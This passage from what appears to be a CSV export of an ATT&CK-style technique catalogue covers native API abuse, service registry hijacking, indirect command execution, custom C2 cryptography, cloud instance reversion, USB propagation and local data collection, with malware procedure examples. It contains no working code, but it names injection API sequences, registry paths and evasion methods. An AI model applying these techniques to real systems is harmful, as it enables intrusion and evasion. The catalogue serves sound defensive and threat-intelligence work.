T1106,Native API,"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.  Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter] the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.  Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.  Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.  Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools]","['[EvilBunny] has used various API calls as part of its checks to see if the malware is running in a sandbox.\t', '[Winnti for Windows] can use Native API to create a new process and to start services.', '[Pony] has used several Windows functions for various purposes.\t', '[Cyclops Blink] can use various Linux API functions including those for execution and discovery.', '[Bisonal] has used the Windows API to communicate with the Service Control Manager to execute a thread.', '[Mis-Type] has used Windows API calls, including `NetUserAdd` and `NetUserDel`.', '[Torisma] has used various Windows API calls.', '[SodaMaster] can use <code>RegOpenKeyW</code> to access the Registry.', 'The file collection tool used by [RainyDay] can utilize native API including <code>ReadDirectoryChangeW</code> for folder monitoring.', '[Cobalt Strike] Beacon payload is capable of running shell commands without <code>cmd.exe</code> and PowerShell commands without <code>powershell.exe</code>', '[ZxxZ] has used API functions such as `Process32First`, `Process32Next`, and `ShellExecuteA`.', '[SideTwist] can use <code>GetUserNameW</code>, <code>GetComputerNameW</code>, and <code>GetComputerNameExW</code> to gather information.', ""During [Operation Dream Job] [Lazarus Group] used Windows API `ObtainUserAgentString` to obtain the victim's User-Agent and used the value to connect to their C2 server."", '[AsyncRAT] has the ability to use OS APIs including `CheckRemoteDebuggerPresent`.', '[Imminent Monitor] has leveraged CreateProcessW() call to execute the debugger.', '[Babuk] can use multiple Windows API calls for actions on compromised hosts including discovery and execution.', '[Cuba] has used several built-in API functions for discovery like GetIpNetTable and NetShareEnum. ', '[Uroburos] can use native Windows APIs including `GetHostByName`.', '[Higaisa] has called various native OS APIs.', '[QakBot] can use <code>GetProcAddress</code> to help delete malicious strings from memory.', '[Clop] has used built-in API functions such as WNetOpenEnumW(), WNetEnumResourceW(), WNetCloseEnum(), GetProcAddress(), and VirtualAlloc().', '[Aria-body] has the ability to launch files using <code>ShellExecute</code>.', '[Ryuk] has used multiple native APIs including <code>ShellExecuteW</code> to run executables,<code>GetWindowsDirectoryW</code> to create folders, and <code>VirtualAlloc</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code> for process injection.', '[Dridex] has used the <code>OutputDebugStringW</code> function to avoid malware analysis as part of its anti-debugging technique. ', '[TinyTurla] has used `WinHTTP`, `CreateProcess`, and other APIs for C2 communications and other functions.', '[AvosLocker] has used a variety of Windows API calls, including `NtCurrentPeb` and `GetLogicalDrives`.', '[BackConfig] can leverage API functions such as <code>ShellExecuteA</code> and <code>HttpOpenRequestA</code> in the process of downloading and executing files.', '[KillDisk] has called the Windows API to retrieve the hard disk handle and shut down the machine.', '[WindTail] can invoke Apple APIs <code>contentsOfDirectoryAtPath</code>, <code>pathExtension</code>, and (string) <code>compare</code>.', '[Ursnif] has used <code>CreateProcessW</code> to create child processes.', '[Pteranodon] has used various API calls.', '[StrifeWater] can use a variety of APIs for execution.', '[Ramsay] can use Windows API functions such as <code>WriteFile</code>, <code>CloseHandle</code>, and <code>GetCurrentHwProfile</code> during its collection and file storage operations. [Ramsay] can execute its embedded components via <code>CreateProcessA</code> and <code>ShellExecute</code>.', '[Chaes] used the <code>CreateFileW()</code> API function with read permissions to access downloaded payloads. ', '[Amadey] has used a variety of Windows API calls, including `GetComputerNameA`, `GetUserNameA`, and `CreateProcessA`.', 'During [Operation Honeybee] the threat actors deployed malware that used API calls, including `CreateProcessAsUser`.', '[TrickBot] uses the Windows API call, CreateProcessW(), to manage execution flow. [TrickBot] has also used <code>Nt*</code> API functions to perform [Process Injection]', '[NightClub] can use multiple native APIs including `GetKeyState`, `GetForegroundWindow`, `GetWindowThreadProcessId`, and `GetKeyboardLayout`.', '[Lazarus Group] has used the Windows API <code>ObtainUserAgentString</code> to obtain the User-Agent from a compromised host to connect to a C2 server. [Lazarus Group] has also used various, often lesser known, functions to perform various types of Discovery and [Process Injection]', '[MarkiRAT] can run the ShellExecuteW API via the Windows Command Shell.', '[Gorgon Group] malware can leverage the Windows API call, CreateProcessA(), for execution.', '[BoxCaon] has used Windows API calls to obtain information about the compromised host.', '[Turla] and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.', '[Taidoor] has the ability to use native APIs for execution including <code>GetProcessHeap</code>, <code>GetProcAddress</code>, and <code>LoadLibrary</code>.', '[Metamorfo] has used native WINAPI calls.', '[Chimera] has used direct Windows system calls by leveraging Dumpert.', 'When executing with non-root permissions, [RotaJakiro] uses the the `shmget` API to create shared memory between other known [RotaJakiro] processes. [RotaJakiro] also uses the `execvp` API to help its dead process ""resurrect"".', '[SombRAT] has the ability to respawn itself using <code>ShellExecuteW</code> and <code>CreateProcessW</code>.', '[build_downer] has the ability to use the <code>WinExec</code> API to execute malware on a compromised host.', ""[Lizar] has used various Windows API functions on a victim's machine. "", '[ROKRAT] can use a variety of API calls to execute shellcode.', '[njRAT] has used the ShellExecute() function within a script.', '[Volgmer] executes payloads using the Windows API call CreateProcessW().', '[Hancitor] has used <code>CallWindowProc</code> and <code>EnumResourceTypesA</code> to interpret and execute shellcode.', '[Avaddon] has used the Windows Crypto API to generate an AES key.', '[WhisperGate] has used the `ExitWindowsEx` to flush file buffers to disk and stop running processes and other API calls.', '[Mispadu] has used a variety of Windows API calls, including ShellExecute and WriteProcessMemory.', '[BlackTech] has used built-in API functions.', '[GuLoader] can use a number of different APIs for discovery and execution.', '[Egregor] has used the Windows API to make detection more difficult. ', 'The [Ninja] loader can call Windows APIs for discovery, process injection, and payload decryption.', '[Saint Bot] has used different API calls, including `GetProcAddress`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateProcessA`, and `SetThreadContext`.', ' [SideCopy] has executed malware by calling the API function `CreateProcessW`.', '[PolyglotDuke] can use <code>LoadLibraryW</code> and <code>CreateProcess</code> to load and execute code.', '[REvil] can use Native API for execution and to retrieve active services.', '[DEADEYE] can execute the `GetComputerNameA` and `GetComputerNameExA` WinAPI functions.', 'During [Operation Wocao] threat actors used the `CreateProcessA` and `ShellExecute` API functions to launch commands after being injected into a selected process.', '[FatDuke] can call <code>ShellExecuteW</code> to open the default browser on the URL localhost.', '[SynAck] parses the export tables of system DLLs to locate and call various Windows API functions.', '[GrimAgent] can use Native API including <code>GetProcAddress</code> and <code>ShellExecuteW</code>.', '[DCSrv] has used various Windows API functions, including `DeviceIoControl`, as part of its encryption process.', ""[HyperStack] can use Windows API's <code>ConnectNamedPipe</code> and <code>WNetAddConnection2</code> to detect incoming connections and connect to remote shares."", '[BADHATCH] can utilize Native API functions such as, `ToolHelp32` and `Rt1AdjustPrivilege` to enable `SeDebugPrivilege` on a compromised machine.', '[Maze] has used several Windows API functions throughout the encryption process including IsDebuggerPresent, TerminateProcess, Process32FirstW, among others.\t', '[Bankshot] creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().', '[HotCroissant] can perform dynamic DLL importing and API lookups using <code>LoadLibrary</code> and <code>GetProcAddress</code> on obfuscated strings.', '[Meteor] can use `WinAPI` to remove a victim machine from an Active Directory domain.', '[Tropic Trooper] has used multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, and HttpAddUrl.', '[metaMain] can execute an operator-provided Windows command by leveraging functions such as `WinExec`, `WriteFile`, and `ReadFile`.', '[Nebulae] has the ability to use <code>CreateProcess</code> to execute a process.', '[MacMa] has used macOS API functions to perform tasks.', '[ToddyCat] has used `WinExec` to execute commands received from C2 on compromised hosts.', '[RCSession] can use WinSock API for communication including <code>WSASend</code> and <code>WSARecv</code>.', '[InnaputRAT] uses the API call ShellExecuteW for execution.', '[menuPass] has used native APIs including <code>GetModuleFileName</code>, <code>lstrcat</code>, <code>CreateFile</code>, and <code>ReadFile</code>.', '[GoldenSpy] can execute remote commands in the Windows command shell using the <code>WinExec()</code> API.\t', '[ComRAT] can load a PE file from memory or the file system and execute it with <code>CreateProcessW</code>.', '[APT37] leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.', '[Empire] contains a variety of enumeration modules that have an option to use API calls to carry out tasks.', '[FoggyWeb] loader can use API functions to load the [FoggyWeb] backdoor into the same Application Domain within which the legitimate AD FS managed code is executed.', '[LitePower] can use various API calls.', 'During [Operation Sharpshooter] the first stage downloader resolved various Windows libraries and APIs, including `LoadLibraryA()`, `GetProcAddress()`, and `CreateProcessA()`.', '[IcedID] has called <code>ZwWriteVirtualMemory</code>, <code>ZwProtectVirtualMemory</code>, <code>ZwQueueApcThread</code>, and <code>NtResumeThread</code> to inject itself into a remote process.', '[Bumblebee] can use multiple Native APIs.', '[BloodHound] can use .NET API calls in the SharpHound ingestor component to pull Active Directory data.', '[HermeticWizard] can connect to remote shares using `WNetAddConnection2W`.', '[SILENTTRINITY] has the ability to leverage API including `GetProcAddress` and `LoadLibrary`.', '[AppleSeed] has the ability to use multiple dynamically resolved API calls.', '[HermeticWiper] can call multiple Windows API functions used for privilege escalation, service execution, and to overwrite random bites of data.', ""[KONNI] has hardcoded API calls within its functions to use on the victim's machine. "", '[Kevin] can use the `ShowWindow` API to avoid detection.', '[DRATzarus] can use various API calls to see if it is running in a sandbox.', '[Prestige] has used the `Wow64DisableWow64FsRedirection()` and `Wow64RevertWow64FsRedirection()` functions to disable and restore file system redirection. ', '[SVCReady] can use Windows API calls to gather information from an infected host.', '[gh0st RAT] has used the `InterlockedExchange`, `SeShutdownPrivilege`, and `ExitWindowsEx` Windows API functions.', '[Pillowmint] has used multiple native Windows APIs to execute and conduct process injections.', '[RTM] can use the <code>FindNextUrlCacheEntryA</code> and <code>FindFirstUrlCacheEntryA</code> functions to search for specific strings within browser history.', '[Milan] can use the API `DnsQuery_A` for DNS resolution.', '[SUNSPOT] used Windows API functions such as <code>MoveFileEx</code> and <code>NtQueryInformationProcess</code> as part of the [SUNBURST] injection process. ', '[Gamaredon Group] malware has used <code>CreateProcess</code> to launch additional malicious components.', '[WarzoneRAT] can use a variety of API calls on a compromised host.', '[Donut] code modules use various API functions to load and inject code.\t', '[BendyBear] can load and execute modules and Windows Application Programming (API) calls using standard shellcode API hashing.', '[Chrommme] can use Windows API including `WinExec` for execution.', '[Akira] executes native Windows functions such as <code>GetFileAttributesW</code> and `GetSystemInfo`.', '[Denis] used the <code>IsDebuggerPresent</code>, <code>OutputDebugString</code>, and <code>SetLastError</code> APIs to avoid debugging. [Denis] used <code>GetProcAddress</code> and <code>LoadLibrary</code> to dynamically resolve APIs. [Denis] also used the <code>Wow64SetThreadContext</code> API as part of a process hollowing process.\t', '[DarkGate] uses the native Windows API <code>CallWindowProc()</code> to decode and launch encoded shellcode payloads during execution. [DarkGate] can call kernel mode functions directly to hide the use of process hollowing methods during execution.', '[Netwalker] can use Windows API functions to inject the ransomware DLL.', '[Lokibot] has used LoadLibrary(), GetProcAddress() and CreateRemoteThread() API functions to execute its shellcode.', '[WastedLocker] custom crypter, CryptOne, leveraged the VirtualAlloc() API function to help execute the payload.', '[LightNeuron] is capable of starting a process using CreateProcess.', '[Sardonic] has the ability to call Win32 API functions to determine if `powershell.exe` is running. ', '[Explosive] has a function to call the OpenClipboard wrapper.  ', '[DarkTortilla] can use a variety of API calls for persistence and defense evasion.', '[Woody RAT] can use multiple native APIs, including `WriteProcessMemory`, `CreateProcess`, and `CreateRemoteThread` for process injection.  ', '[Bad Rabbit] has used various Windows API calls.', '[Brute Ratel C4] can call multiple Windows APIs for execution, to share memory, and defense evasion.', '[Diavol] has used several API calls like `GetLogicalDriveStrings`, `SleepEx`, `SystemParametersInfoAPI`, `CryptEncrypt`, and others to execute parts of its attack.', '[FunnyDream] can use Native API for defense evasion, discovery, and collection.', '[HyperBro] has the ability to run an application (<code>CreateProcessW</code>) or script/file (<code>ShellExecuteW</code>) via API.', '[RDFSNIFFER] has used several Win32 API functions to interact with the victim machine.', '[Bandook] has used the ShellExecuteW() function call. ', '[ShimRat] has used Windows API functions to install the service and shim.\t', '[KOCTOPUS] can use the `LoadResource` and `CreateProcessW` APIs for execution.', 'After escalating privileges, [MegaCortex] calls <code>TerminateProcess()</code>, <code>CreateRemoteThread</code>, and other Win32 APIs.', '[QUIETCANARY] can call `System.Net.HttpWebRequest` to identify the default proxy configured on the victim computer.', '[NETWIRE] can use Native API including <code>CreateProcess</code> <code>GetProcessById</code>, and <code>WriteProcessMemory</code>.', '[PLEAD] can use `ShellExecute` to execute applications.', ""[Goopy] has the ability to  enumerate the infected system's user name via <code>GetUserNameW</code>."", '[S-Type] has used Windows APIs, including `GetKeyboardType`, `NetUserAdd`, and `NetUserDel`.', ""[xCaon] has leveraged native OS function calls to retrieve  victim's network adapter's  information using GetAdapterInfo() API. "", '[Carberp] has used the NtQueryDirectoryFile and ZwQueryDirectoryFile functions to hide files and directories.', ""[APT38] has used the Windows API to execute code within a victim's system. "", '[Mafalda] can use a variety of API calls.', '[ADVSTORESHELL] is capable of starting a process using CreateProcess.', '[Gelsemium] has the ability to use various Windows API functions to perform tasks.', '[Royal] can use multiple APIs for discovery, communication, and execution.', '[Grandoreiro] can execute through the <code>WinExec</code> API.', '[Flagpro] can use Native API to enable obfuscation including `GetLastError` and `GetTickCount`.', '[Black Basta] has the ability to use native APIs for numerous functions including discovery and defense evasion.', '[BADNEWS] has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.', '[Stuxnet] uses the SetSecurityDescriptorDacl API to reduce object integrity levels.', '[TA505] has deployed payloads that use Windows API calls on a compromised host.', '[PcShare] has used a variety of Windows API functions.', '[ThiefQuest] uses various API to perform behaviors such as executing payloads and performing local enumeration.', '[PlugX] can use the Windows API functions `GetProcAddress`, `LoadLibrary`, and `CreateProcess` to execute another process.', '[Waterbear] can leverage API functions for execution.', '[PipeMon] first stage has been executed by a call to <code>CreateProcess</code> with the decryption password in an argument. [PipeMon] has used a call to <code>LoadLibrary</code> to load its installer.', '[SysUpdate] can call the `GetNetworkParams` API as part of its C2 establishment process.', '[SharpDisco] can leverage Native APIs through plugins including `GetLogicalDrives`.', '[Bazar] can use various APIs to allocate memory and facilitate code execution/injection.', '[CaddyWiper] has the ability to dynamically resolve and use APIs, including `SeTakeOwnershipPrivilege`.', '[ZxShell] can leverage native API including <code>RegisterServiceCtrlHandler </code> to register a service.RegisterServiceCtrlHandler ', '[HAWKBALL] has leveraged several Windows API calls to create processes, gather disk information, and detect debugger activity.', '[Rising Sun] used dynamic API resolutions to various Windows APIs by leveraging `LoadLibrary()` and `GetProcAddress()`.', '[Mosquito] leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.', '[Attor] dispatcher has used CreateProcessW API for execution.', '[CostaBricks] has used a number of API calls, including `VirtualAlloc`, `VirtualFree`, `LoadLibraryA`, `GetProcAddress`, and `ExitProcess`. ', '[ShimRatReporter] used several Windows API functions to gather information from the infected system.', '[BitPaymer] has used dynamic API resolution to avoid identifiable strings within the binary, including <code>RegEnumKeyW</code>.', '[Siloscape] makes various native API calls.', '[BBK] has the ability to use the <code>CreatePipe</code> API to add a sub-process for execution via [cmd]', '[Conti] has used API calls during execution. ', '[Emotet] has used `CreateProcess` to create a new process to run its executable and `WNetEnumResourceW` to enumerate non-hidden shares.', '[XAgentOSX] contains the execFile function to execute a specified file on the system using the NSTask:launch method.', '[Samurai] has the ability to call Windows APIs.', '[InvisiMole] can use winapiexec tool for indirect execution of  <code>ShellExecuteW</code> and <code>CreateProcessA</code>.', '[Misdat] has used Windows APIs, including `ExitWindowsEx` and `GetKeyboardType`. ', '[Silence] has leveraged the Windows API, including using CreateProcess() or ShellExecute(), to perform a variety of tasks.', '[Sharpshooter] first-stage downloader resolved various Windows libraries and APIs, including LoadLibraryA(), GetProcAddress(), and CreateProcessA().\t', '[Operation Wocao] has used the CreateProcessA and ShellExecute API function to launch commands after being injected into a selected process.', '[Cobalt Strike] ""beacon"" payload is capable of running shell commands without <code>cmd.exe</code> and PowerShell commands without <code>powershell.exe</code>']",False
T1058,Service Registry Permissions Weakness,"Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell] or [Reg] Access to Registry keys is controlled through Access Control Lists and permissions.   If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).  Adversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.",[],True
T1202,Indirect Command Execution,"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd] For example, [Forfiles] the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter] Run window, or via scripts.    Adversaries may abuse these features for [Defense Evasion] specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd] or file extensions more commonly associated with malicious payloads.","['[Lazarus Group] persistence mechanisms have used <code>forfiles.exe</code> to execute .htm files.', '[Forfiles] can be used to subvert controls and possibly conceal command execution by not directly invoking [cmd]', '[Revenge RAT] uses the [Forfiles] utility to execute commands on the system.']",False
T1024,Custom Cryptographic Protocol,"Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.  Custom encryption schemes may vary in sophistication. Analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used.  Some adversaries may also attempt to implement their own version of a well-known cryptographic algorithm instead of using a known implementation library, which may lead to unintentional errors. ","['[3PARA RAT] will use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS instead if the DES decoding fails.', '[Carbanak] uses XOR with random keys for its communications.', '[ChChes] can encrypt C2 data with a custom technique using MD5, base64-encoding, and RC4.', '[Bisonal] variants reported on in 2014 and 2015 used a simple XOR cipher for C2.', '[WannaCry] uses a custom cryptographic protocol over the [Tor] circuit.', 'The original variant of [FakeM] encrypts C2 traffic using a custom encryption cipher that uses an XOR key of “YHCRA” and bit rotation between each XOR operation. [FakeM] has also included HTML code in C2 traffic in an apparent attempt to evade detection. Additionally, some variants of [FakeM] use modified SSL code for communications back to C2 servers, making SSL decryption ineffective.', '[Taidoor] is known to utilize encryption within network protocols.', '[Gazer] uses custom encryption for C2 using 3DES and RSA.', 'Several [Lazarus Group] malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another [Lazarus Group] malware sample XORs C2 traffic. [Lazarus Group] malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, evading SSL man-in-the-middle decryption attacks.']",True
T1536,Revert Cloud Instance,"An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.  Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.",[],True
T1091,Replication Through Removable Media,"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.  Mobile devices may also be used to infect PCs with malware if connected via USB. This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables. For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).","['[Flame] contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using Autorun functionality.', '[APT30] may have used the [SHIPSHAPE] malware to move onto air-gapped networks. [SHIPSHAPE] targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document.', '[LuminousMoth] has used malicious DLLs to spread malware to connected removable USB drives on infected machines.', '[Unknown Logger] is capable of spreading to USB devices.', '[Aoqin Dragon] has used a dropper that employs a worm infection strategy using a removable device to breach a secure network environment.', '[DustySky] searches for removable media and duplicates itself onto it.', '[H1N1] has functionality to copy itself to removable media.', '[Darkhotel] selective infector modifies executables stored on removable media as a method of spreading across computers.', '[Stuxnet] can propagate via removable media using an autorun.inf file or the CVE-2010-2568 LNK vulnerability.', '[Mustang Panda] has used a customized [PlugX] variant which could spread through USB connections.', '[Agent.btz] drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.', '[njRAT] can be configured to spread via removable drives.', '[USBferry] can copy its installer to attached USB storage devices.', 'Part of [APT28] operation involved using [CHOPSTICK] modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic.', '[Crimson] can spread across systems by infecting removable media.', '[FIN7] actors have mailed USB drives to potential victims containing malware that downloads and installs various backdoors, including in some cases for ransomware operations.', '[Ramsay] can spread itself by infecting other portable executable files on removable drives.\t', '[QakBot] has the ability to use removable drives to spread through compromised networks.', '[ANDROMEDA] has been spread via infected USB keys.', '[USBStealer] drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.', '[APT28] uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.', '[Conficker] variants used the Windows AUTORUN feature to spread through USB propagation.', '[Ursnif] has copied itself to and infected removable drives for propagation.', '[Tropic Trooper] has attempted to transfer [USBferry] from an infected USB device by copying an Autorun function to the target machine.']",False
T1005,Data from Local System,"Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.  Adversaries may do this using a [Command and Scripting Interpreter] such as [cmd] as well as a [Network Device CLI] which have functionality to interact with the file system to gather information. Adversaries may also use [Automated Collection] on the local system. ","['[Kimsuky] has collected Office, PDF, and HWP documents from its victims.', '[BRONZE BUTLER] has exfiltrated files stolen from local systems.', '[Proxysvc] searches the local system and gathers data.', '[Drovorub] can transfer files from the victim machine.', '[Cryptoistic] can retrieve files from the local file system.', ""[xCaon] has uploaded files from victims' machines."", '[LAPSUS$] uploaded sensitive files, information, and credentials from a targeted organization for extortion or public release.', '[APT39] has used various tools to steal files from the compromised host.', '[QakBot] can use a variety of commands, including esentutl.exe to steal sensitive data from Internet Explorer and Microsoft Edge, to acquire information that is subsequently exfiltrated.', '[ccf32] can collect files from a compromised host.', '[Dtrack] can collect a variety of information from victim machines.', '[Bankshot] collects files from the local system.', ""When it first starts, [BADNEWS] crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt."", '[HAFNIUM] has collected data and files from a compromised machine.', '[SVCReady] can collect data from an infected host.', '[Rising Sun] has collected data and files from a compromised host.', '[PUNCHTRACK] scrapes memory for properly formatted payment card data.', '[China Chopper] server component can upload local files.', '[Axiom] has collected data from a compromised network.', '[Uroburos] can use its `Get` command to exfiltrate specified files from the compromised system.', '[Octopus] can exfiltrate files from the system using a documents collector tool.', '[FLASHFLOOD] searches for interesting files (either a default or customized set of file extensions) on the local system. [FLASHFLOOD] will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories. [FLASHFLOOD] also collects information stored in the Windows Address Book.', '[P.A.S. Webshell] has the ability to copy files on a compromised host.', '[ToddyCat] has run scripts to collect documents from targeted hosts.', '[Cobalt Strike] can collect data from a local system.', '[Windigo] has used a script to gather credentials in files left on disk by OpenSSH backdoors.', '[GrimAgent] can collect data and files from a compromised host.', '[NightClub] can use a file monitor to steal specific files from targeted systems.', '[Nebulae] has the capability to upload collected files to C2.', '[KONNI] has stored collected information and discovered processes in a tmp file.', '[WarzoneRAT] can collect data from a compromised host.', '[PingPull] can collect data from a compromised host.', '[PowerSploit] contains a collection of Exfiltration modules that can access data from local files, volumes, and processes.', 'During [Night Dragon] the threat actors collected files and other data from compromised systems.', '[RAPIDPULSE] retrieves files from the victim system via encrypted commands sent to the web shell.', '[Fox Kitten] has searched local system resources to access sensitive documents.', '[Caterpillar WebShell] has a module to collect information from the local database. ', '[Andariel] has collected large numbers of files from compromised network systems for later extraction.', '[Amadey] can collect information from a compromised host.', ' [BLINDINGCAN] has uploaded files from victim machines.', '[APT1] has collected files from a local victim.', ""[GALLIUM] collected data from the victim's local system, including password hashes from the SAM hive in the Registry."", '[SombRAT] has collected data and files from a compromised host.', '[APT29] has stolen data from compromised hosts.', '[Lazarus Group] has collected data and files from compromised networks.', ""[Ramsay] can collect Microsoft Word documents from the target's file system, as well as <code>.txt</code>, <code>.doc</code>, and <code>.xls</code> files from the Internet Explorer cache.\t"", ""[MarkiRAT] can upload data from the victim's machine to the C2 server."", '[Gamaredon Group] has collected files from infected systems and uploaded them to a C2 server.', '[OutSteel] can collect information from a compromised host.', '[WellMess] can send files from the victim machine to C2.', '[FIN6] has collected and exfiltrated payment card data from compromised systems.', '[Mafalda] can collect files and information from a compromised host.', '[SysUpdate] can collect information and files from a compromised host.', '[yty] collects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server.', '[Bumblebee] can capture and compress stolen credentials from the Registry and volume shadow copies.', '[EnvyScout] can collect sensitive NTLM material from a compromised host.', 'During [Operation Wocao] threat actors exfiltrated files and directories of interest from the targeted system.', '[Turla] RPC backdoors can upload files from victim machines.', '[Hydraq] creates a backdoor through which remote attackers can read data from files.', '[SUNBURST] collected information from a compromised host.', '[FoggyWeb] can retrieve configuration data from a compromised AD FS server.', '[Cyclops Blink] can upload files from a compromised host.', '[PowerLess] has the ability to exfiltrate data, including Chrome and Edge browser database files, from compromised machines. ', '[APT41] has uploaded files and data from a compromised host.', '[DRATzarus] can collect information from a compromised host.', 'During [C0015] the threat actors obtained files and data from the compromised network.', '[Sardonic] has the ability to collect data from a compromised machine to deliver to the attacker. ', '[BlackMould] can copy files on a compromised host.', '[MobileOrder] exfiltrates data collected from the victim mobile device.', '[ZxShell] can transfer files from a compromised host.', '[Bazar] can retrieve information from the infected machine.', '[SpicyOmelette] has collected data and other information from a compromised host.', '[SharpDisco] has dropped a recent-files stealer plugin to `C:\\Users\\Public\\WinSrcNT\\It11.exe`.', 'During [Operation Dream Job] [Lazarus Group] used malicious Trojans and DLL files to exfiltrate data from an infected host.', '[DanBot] can upload files from compromised hosts.', '[InvisiMole] can collect data from the system, and can monitor changes in specified directories.', '[Crimson] can collect information from a compromised host.', '[SLOTHFULMEDIA] has uploaded files and information from victim machines.', '[AppleSeed] can collect data on a compromised host.', '[MacMa] can collect then exfiltrate files from the compromised system.', '[SLIGHTPULSE] can read files specified on the local system.', '[LuminousMoth] has collected files and data from compromised machines.', ""[APT37] has collected data from victims' local systems."", '[Flagpro] can collect data from a compromised host, including Windows authentication information.', ""[Taidoor] can upload data and files from a victim's machine."", '[IceApple] can collect files, passwords, and other data from a compromised host.', '[Misdat] has collected files and data from a compromised host.', '[Tomiris] has the ability to collect recent files matching a hardcoded list of extensions prior to exfiltration.', '[Dragonfly] has collected data from local victim systems.', '[CURIUM] has exfiltrated data from a compromised machine.', '[Shark] can upload files to its C2.', '[Woody RAT] can collect information from a compromised host.', '[XCSSET] collects contacts and application data from files in Desktop, Documents, Downloads, Dropbox, and WeChat folders.', 'During the [SolarWinds Compromise] [APT29] extracted files from compromised networks.', '[APT28] has retrieved internal documents from machines inside victim environments, including by using [Forfiles] to stage documents before exfiltration.', '[BoxCaon] can upload files from a compromised host.', ' [Brute Ratel C4] has the ability to upload files from a compromised system.', '[AuTo Stealer] can collect data such as PowerPoint files, Word documents, Excel files, PDF files, text files, database files, and image files from an infected machine.', '[SDBbot] has the ability to access the file system on a compromised host.', '[QuasarRAT] can retrieve files from compromised client machines.', '[Ursnif] has collected files from victim machines, including certificates and cookies.', '[Rover] searches for files on local drives based on a predefined list of file extensions.', '[FrameworkPOS] can collect elements related to credit card data from process memory.', 'During [C0017] [APT41] collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks. ', '[Calisto] can collect data from user directories.', '[TrickBot] collects local files and information from the victim’s local machine.', '[Bisonal] has collected information from a compromised host. ', '[Inception] used a file hunting plugin to collect .txt, .pdf, .xls or .doc files from the infected host.', '[PcShare] can collect files and information from a compromised host.', ""[Mongall] has the ability to upload files from victim's machines."", '[Ke3chang] gathered information and files from local directories for 